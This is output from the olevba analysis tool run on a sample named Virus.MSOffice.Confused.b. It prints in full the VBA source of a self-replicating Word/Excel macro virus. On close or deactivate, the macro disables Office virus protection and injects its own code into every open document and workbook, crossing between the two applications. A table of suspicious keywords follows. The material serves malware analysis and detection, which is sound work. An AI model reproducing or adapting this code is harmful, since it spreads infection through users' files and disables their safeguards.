olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Confused.b-7a1edae6e50140b708b516d0862be8364af1b00a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Confused.b-7a1edae6e50140b708b516d0862be8364af1b00a - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Confused ][
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 0
Application.EnableCancelKey = 0
Set α = VBProject.VBComponents("ThisDocument").CodeModule: λ = α.Lines(1, α.CountOfLines + 1)
Err.Clear: Set υ = GetObject(, "Excel.Application").VBE.ActiveVBProject.VBComponents("ThisWorkbook").CodeModule
If Err.Number = 0 Then If υ.Find("~^^~", 0, 0, 0, 0, False, False) = False Then υ.InsertLines υ.CountOfLines + 1, λ
For ι = 1 To Documents.Count
Set υ = Documents(ι).VBProject.VBComponents(α).CodeModule
If υ.Find("~^^~", 0, 0, 0, 0, False, False) = False Then
υ.InsertLines υ.CountOfLines + 1, λ
End If: Next
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableEvents = 1
Application.EnableCancelKey = 0
Set α = VBProject.VBComponents("ThisWorkbook").CodeModule: λ = α.Lines(1, α.CountOfLines + 1)
Err.Clear: Set υ = GetObject(, "Word.Application").VBE.ActiveVBProject.VBComponents("ThisDocument").CodeModule
If Err.Number = 0 Then If υ.Find("~^^~", 0, 0, 0, 0, False, False) = False Then υ.InsertLines υ.CountOfLines + 1, λ
For ι = 1 To Workbooks.Count
Set υ = Workbooks(ι).VBProject.VBComponents(α).CodeModule
If υ.Find("~^^~", 0, 0, 0, 0, False, False) = False Then
υ.InsertLines υ.CountOfLines + 1, λ
End If: Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Confused.b-7a1edae6e50140b708b516d0862be8364af1b00a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Confused.b-7a1edae6e50140b708b516d0862be8364af1b00a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Confused.b-7a1edae6e50140b708b516d0862be8364af1b00a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

